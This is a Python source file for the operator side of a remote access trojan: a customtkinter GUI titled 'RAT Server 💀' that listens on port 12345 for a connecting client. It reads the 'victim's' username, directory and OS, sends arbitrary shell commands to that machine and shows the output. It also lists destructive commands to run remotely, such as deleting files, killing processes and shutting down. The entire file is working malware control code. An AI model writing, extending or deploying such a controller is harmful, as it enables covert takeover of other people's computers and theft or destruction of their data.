import customtkinter as ctk
import threading
import socket
from virtual_keyboard import NormalKeyboard
import subprocess
import platform

active_client = [None]  # Используем список как контейнер
port = 12345
active_user = ["Unknown"]  # Добавили имя пользователя
current_OS = "Unknown" 

list_of_command = {
        "Windows": [
            "gdown <URL> <output_path> - скачивает файл с Google Drive",
            "dir - показує вміст поточної директорії",
            "cd <шлях> - змінює поточну директорію",
            "ipconfig - мережеві інтерфейси",
            "cls - очищення екрану",
            "ping <адреса> - перевірка доступності",
            "mkdir <папка> - нова директорія",
            "exit - завершує роботу",
            "copy <файл1> <файл2> - копіює файл",
            "del <файл> - видаляє файл",
            "move <файл> <папка> - переміщує файл",
            "tasklist - список запущених процесів",
            "taskkill /IM <ім'я процесу> - завершити процесс",
            "chkdsk - проверка диска",
            "shutdown /s - вимкнення комп'ютера",
            "systeminfo - информация про систему",
        ],
        "Linux": [
            "gdown <URL> <output_path> - скачивает файл с Google Drive",
            "ls - перегляд вмісту каталогу",
            "cd <шлях> - зміна каталогу",
            "rm <файл> - видалення файлів",
            "clear - очищення екрану",
            "mkdir <каталог> - створення каталогу",
            "exit - завершує роботу",
            "cp <файл1> <файл2> - копіює файл",
            "mv <файл> <каталог> - переміщує файл",
            "touch <файл> - створення нового файлу",
            "chmod <права> <файл> - зміна прав доступу",
            "ps - список запущених процесів",
            "kill <PID> - завершити процес",
            "shutdown - вимкнення системи",
            "ifconfig - налаштування мережевих інтерфейсов",
        ]
}

def safe_textbox_insert(textbox, text):
    textbox.configure(state="normal")
    textbox.insert("end", text)
    textbox.yview("end")
    textbox.configure(state="disabled")

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def get_user_name(client_socket):
    user_name = ""
    while True:
        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
        user_name += data
        if "END_OF_USER_MSG" in user_name:
            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
            break
    return user_name

def get_current_directory(client_socket):
    current_dir = ""
    while True:
        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
        current_dir += data
        if "END_OF_DIR_MSG" in current_dir:
            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
            break
    return current_dir


def read_all_info(client_socket):
    data = ""
    while True:
        chunk = client_socket.recv(10000).decode("utf-8", errors="replace")
        if not chunk:
            break
        data += chunk
        # Проверяем, что в данных есть все три маркера
        if ("END_OF_USER_MSG" in data and
            "END_OF_DIR_MSG" in data and
            "END_OF_OS_MSG" in data):
            break
    return data

    # Далее можешь продолжить обрабатывать команды из remaining или читать из сокета, как у тебя дальше в коде...


def is_message_end(data):
    return (
        data.endswith("END_OF_USER_MSG") or 
        data.endswith("END_OF_DIR_MSG") or 
        data.endswith("END_OF_MSG") or
        data.endswith("END_OF_OS_MSG")
    )


def is_command(data):
    return not is_message_end(data)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        return output
    except Exception as e:
        return f"❌ Ошибка выполнения команды: {e}"

def receive_full_response(client_socket):
    buffer = ""
    client_socket.settimeout(2)  # Например, 2 секунды ожидания новых данных
    try:
        while True:
            data = client_socket.recv(10000).decode("utf-8", errors="replace")
            if not data:
                break  # Соединение закрыто или нет данных
            buffer += data
            if any(marker in buffer for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                break  # Получили полный ответ
    except socket.timeout:
        # Таймаут, считаем что данные больше не будут
        pass
    finally:
        client_socket.settimeout(None)  # Сброс таймаута в None (блокирующий режим)
    return buffer


def send_command_to_client(command_line, client_socket, text_box):
    """Отправка команды на клиент или выполнение локально, если не подключено"""
    command = command_line.get()
    if not command:
        return
    
    if command in ("cls", "clear"):
        text_box.configure(state="normal")
        text_box.delete("1.0", "end")
        text_box.configure(state="disabled")
        command_line.delete(0, "end")
        return

    if client_socket:
        # Клиент подключён — отправляем команду
        safe_textbox_insert(text_box, f"📤 Отправлена команда: {command}\n")
        text_box.yview("end")
        try:
            client_socket.send(command.encode(encoding="utf-8", errors="replace"))
            response = receive_full_response(client_socket)
            if any(marker in response for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                safe_textbox_insert(text_box, f"📥 Ответ от клиента: {response}\n")
                safe_textbox_insert(text_box, "="*24+"End Text"+"="*24+"\n")
            else:
                safe_textbox_insert(text_box, f"📥 Ответ от клиента: {response}\n")

        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка отправки: {e}\n")
    else:
        # Клиент не подключён — выполняем локально
        safe_textbox_insert(text_box, f"⚙ Выполнение локально: {command}\n")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            safe_textbox_insert(text_box, f"📥 Локальный вывод:\n{output}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка локального выполнения: {e}\n")
    command_line.delete(0, "end")
    text_box.yview("end")

def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    def handle_client(client_socket, text_box, username_label, dir_label, os_label):
        global current_OS

        full_data = read_all_info(client_socket)

        # Удаляем или заменяем все END_OF_MSG, если вдруг есть в начальных данных
        full_data = full_data.replace("END_OF_MSG", " ")

        # Парсим имя пользователя
        user_name = full_data.split("END_OF_USER_MSG")[0].strip()

        # Парсим директорию
        current_dir = full_data.split("END_OF_USER_MSG")[1].split("END_OF_DIR_MSG")[0].strip()

        # Парсим ОС
        current_OS = full_data.split("END_OF_DIR_MSG")[1].split("END_OF_OS_MSG")[0].strip()

        # Остаток, если нужно
        remaining = full_data.split("END_OF_OS_MSG")[1].strip() if "END_OF_OS_MSG" in full_data else ""

        # Обновляем UI
        username_label.configure(text=f"Username victim: {user_name}")
        dir_label.configure(text=f"Current dir: {current_dir}")
        os_label.configure(text=f"OS: {current_OS}")

        # After you've set current_OS in handle_client, add:
        if current_OS in list_of_command:
            # Очистить контейнер команд
            for widget in commands_container.winfo_children():
                widget.destroy()

            # Добавить команды в commands_container с place
            y_position = 10  # начальная координата Y
            for cmd in list_of_command[current_OS]:
                command_label = ctk.CTkLabel(commands_container, text=cmd, width=660, wraplength=650)
                command_label.pack(pady=3)

        safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
        safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
        safe_textbox_insert(text_box, f"🖥️ ОС: {current_OS}\n")

    def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                active_client[0] = client_socket
                status_label.configure(text="🟢 Connected", text_color="green")
                print(f"Клиент подключен: {client_address}")
                text_box.insert("end", "Client is connected")
                client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                print(f"Ошибка подключения: {e}")
                safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
                status_label.configure(text="🔴 Error", text_color="red")
                break

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Чтобы избежать WinError 10048
    try:
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(1)
    except OSError as e:
        print(f"Ошибка при привязке сокета: {e}")
        return  # Можно вывести это в UI

    # Основной контейнер с горизонтальным разделением (левая и правая части)
    main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
    main_frame.pack(fill="both", expand=True)

    # Левая часть (панель кнопок)
    left_frame = ctk.CTkFrame(main_frame, width=200)
    left_frame.pack(side="left", fill="y", padx=10, pady=10)

    # Правая часть (состоит из верхней и нижней)
    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="left", fill="both", expand=True, padx=10, pady=10)

    # Верхняя часть правой панели (текстбокс и поле ввода)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True)

    bottom_frame = ctk.CTkFrame(main_frame)
    # bottom_frame.pack(fill="x", pady=10)

    menu_frame = ctk.CTkFrame(main_frame, width=700, fg_color="#08080A", corner_radius=10)

    commands_container = ctk.CTkScrollableFrame(menu_frame, width=650, height=200)
    commands_container.place(x=10, y=130)  # Под заголовками, с небольшим отступом

    close_menu = ctk.CTkButton(menu_frame, text="X", width=50, height=50, command=lambda: animate_sidebar_close(menu_frame))
    close_menu.place(relx=0.99, rely=0.05, anchor="ne")

    close_keyboard_button = ctk.CTkButton(
        bottom_frame,
        text="X",
        font=("Arial", 25),
        command=lambda: hide_keyboard(),
        fg_color="#3b3b3b",
        border_color="#8d33ff",
        hover_color="#444444",
        width=50,
        height=50,
        border_width=2
    )
    close_keyboard_button.place(relx=1.0, rely=0.0, anchor="ne", x=-10, y=10)

    # === Левая панель ===
    title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"), text_color="#8a2be2")
    title.pack(pady=5)

    # === Правая верхняя панель ===
    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...", fg_color="#111111", text_color="#39ff14", placeholder_text_color="#444444")
    command_line.pack(fill="x", padx=5, pady=5)

    send_button = ctk.CTkButton(
        top_right_frame,
        text="📤 Отправить",
        command=lambda: send_command_to_client(command_line, active_client[0], text_box), 
        fg_color="#1a1a1a", 
        hover_color="#8a2be2", 
        text_color="#ff0033"
    )
    send_button.pack(padx=5, pady=5)

    text_box = ctk.CTkTextbox(top_right_frame, fg_color="#0f0f0f", text_color="#39ff14")
    text_box.pack(fill="both", expand=True, padx=5, pady=5)

    # === Кнопка для старта сервера ===
    def run_server():
        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label, dir_label, os_label))
        thread.daemon = True
        thread.start()

    username_label = ctk.CTkLabel(menu_frame, text="Username victim: Unknown", width=300)
    username_label.place(x=10, y=10)

    dir_label = ctk.CTkLabel(menu_frame, text="Current dir: Unknown", width=300)
    dir_label.place(x=10, y=50)

    os_label = ctk.CTkLabel(menu_frame, text="OS: Unknown", width=300)
    os_label.place(x=10, y=90)

    start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=lambda: run_server())
    start_server_btn.pack(pady=10)

    back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
    back_btn.pack(pady=10)

    Info = ctk.CTkLabel(left_frame, text="ℹ️ Info:", text_color="#040177")
    Info.pack(pady=10)

    # Индикатор подключения
    status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
    status_label.pack(pady=5)

    # === Логирование в text_box ===
    safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
    text_box.configure(state="disabled")
    text_box.pack(pady=10, fill="both", expand=True, padx=20)

    auto_thread = None  # Объявим переменную, но не запускаем поток
    
    # Переменная для хранения активного поля
    active_entry = None
    def set_target_entry(entry, name):
        nonlocal active_entry
        active_entry = entry
        keyboard.target_entry = entry
        #print(f"[DEBUG] Активное поле ввода: {name}")

    # Виртуальная клавиатура в нижнем фрейме
    keyboard = None  # Клавиатура будет создана позже


    # Привязка клавиатуры к полям ввода
    command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])

    keyboard_visible = False

    def slide_keyboard(target_y, step=10):
        parent_frame.update()
        parent_frame_width = parent_frame.winfo_width()
        x_pos = (parent_frame_width - keyboard_width) // 2

        current_y = bottom_frame.winfo_y()
        if abs(current_y - target_y) < step:
            bottom_frame.place_configure(x=x_pos, y=target_y, width=keyboard_width, height=keyboard_height)
            return
        direction = 1 if target_y > current_y else -1
        next_y = current_y + direction * step
        bottom_frame.place_configure(x=x_pos, y=next_y, width=keyboard_width, height=keyboard_height)
        parent_frame.after(10, lambda: slide_keyboard(target_y, step))


    def show_keyboard():
        nonlocal keyboard_visible, keyboard
        if keyboard_visible:
            return

        if keyboard is None:
            keyboard = NormalKeyboard(bottom_frame, command_line)
            # Привязка только при первом создании:
            command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])

        keyboard_visible = True
        slide_keyboard(target_y=parent_frame.winfo_height() - 300)


    def hide_keyboard():
        nonlocal keyboard_visible
        if not keyboard_visible:
            return
        keyboard_visible = False
        slide_keyboard(target_y=parent_frame.winfo_height())

    def toggle_keyboard():
        if keyboard_visible:
            hide_keyboard()
        else:
            show_keyboard()

    toggle_button = ctk.CTkButton(
        left_frame,
        text="⌨ Клавиатура",
        command=lambda: toggle_keyboard(),
        fg_color="#3b3b3b",
        border_color="#8d33ff",
        hover_color="#444444",
        border_width=2
    )
    toggle_button.pack(side="left", padx=10)


    # Изначально клавиатура скрыта (сдвигаем за пределы контейнера)
    keyboard_width = 750
    keyboard_height = 300

    def place_keyboard_at(y_pos):
        parent_frame.update()
        parent_frame_width = parent_frame.winfo_width()
        x_pos = (parent_frame_width - keyboard_width) // 2
        bottom_frame.place(in_=parent_frame, x=x_pos, y=y_pos, width=keyboard_width, height=keyboard_height)

    # Изначально скрываем клавиатуру
    parent_frame.after(100, lambda: place_keyboard_at(parent_frame.winfo_height()))

    is_animation = False
    sidebar_visible = False  # Флаг

    # Функция для анимации панели (плавное появление)
    def toggle_sidebar():
        nonlocal sidebar_visible
        if sidebar_visible:
            animate_sidebar_close(menu_frame)
            # sidebar_visible = False  <- убираем отсюда
        else:
            parent_frame.update_idletasks()
            start_x = parent_frame.winfo_width()
            target_x = start_x - 900
            menu_frame.place(x=start_x, y=0, relheight=1.0)
            animate_sidebar_open(menu_frame, target_x)
            sidebar_visible = True

    # Анимация появления
    def animate_sidebar_open(frame, target_x, step=20):
        current_x = parent_frame.winfo_width()
        def slide():
            nonlocal current_x
            if current_x > target_x:
                current_x -= step
                frame.place(x=current_x, y=0, relheight=1.0)
                parent_frame.after(10, slide)
            else:
                frame.place(x=target_x, y=0, relheight=1.0)
        slide()


    def animate_sidebar_close(frame, step=20):
        current_x = frame.winfo_x()
        target_x = parent_frame.winfo_width()

        def slide():
            nonlocal current_x
            if current_x < target_x:
                current_x += step
                frame.place(x=current_x, y=0, relheight=1.0)
                parent_frame.after(10, slide)
            else:
                frame.place_forget()
                nonlocal sidebar_visible
                sidebar_visible = False  # Меняем флаг здесь, после анимации закрытия
        slide()

    hamburger_btn = ctk.CTkButton(
        top_right_frame,
        text="☰",  # Символ гамбургера
        command=toggle_sidebar,
        width=40,
        height=40
    )
    hamburger_btn.place(relx=0.99, rely=0.1, anchor="ne")

    # if current_OS in list_of_command:
    #     # Очистить контейнер команд
    #     for widget in commands_container.winfo_children():
    #         widget.destroy()

    #     # Добавить команды в commands_container с place
    #     y_position = 10  # начальная координата Y
    #     for cmd in list_of_command[current_OS]:
    #         command_label = ctk.CTkLabel(commands_container, text=cmd)
    #         command_label.place(x=10, y=y_position)
    #         y_position += command_label.winfo_reqheight() + 5  # смещение по Y для следующей метки
